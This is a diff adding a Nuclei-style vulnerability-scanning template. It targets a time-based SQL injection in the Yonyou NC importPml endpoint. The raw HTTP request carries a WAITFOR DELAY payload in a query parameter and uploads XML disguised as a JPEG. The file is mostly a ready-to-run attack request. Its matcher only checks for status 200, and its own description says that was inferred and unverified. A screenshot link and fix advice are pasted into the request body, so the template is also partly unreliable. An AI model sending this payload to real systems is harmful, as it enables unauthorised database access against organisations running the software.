@@ -1,0 +1,65 @@
+id: poc-8597072159
+info:
+  name: 用友NC importPml SQL注入漏洞_vu9ow1zdutfcgbtp
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+http:
+- raw:
+  - 'POST /portal/pt/portalpage/importPml?pageId=login&billitem=1''WAITFOR+DELAY+''0:0:5''-- HTTP/1.1
+
+
+    Host: {{Hostname}}
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryH970hbttBhoCyj9V
+
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
+
+
+    Connection: close
+
+
+    ------WebKitFormBoundaryH970hbttBhoCyj9V
+
+
+    Content-Disposition: form-data; name="Filedata"; filename="1.jpg"
+
+
+    Content-Type: image/jpeg
+
+
+    <?xml version="1.0" encoding="UTF-8"?>
+
+
+    <page template="adminonerow" version="101"  i18nname="admin-00001"  visibility="0"  isdefault="true" skin="webclassic" level="0"  linkgroup="0000z010000000000002"  ordernum="15">
+
+
+    </page>
+
+
+    ------WebKitFormBoundaryH970hbttBhoCyj9V--
+
+
+    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1717058319037-97bb3ae0-c772-4b0d-b02a-1cc97dcdcd92.png)
+
+
+    ## 修复建议
+
+    <font style="color:#333333;">1、请联系厂商进行修复或升级到安全版本。
+
+    </font><font style="color:#333333;">2、如非必要，禁止公网访问该系统。
+
+    </font><font style="color:#333333;">3、设置白名单访问。</font>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
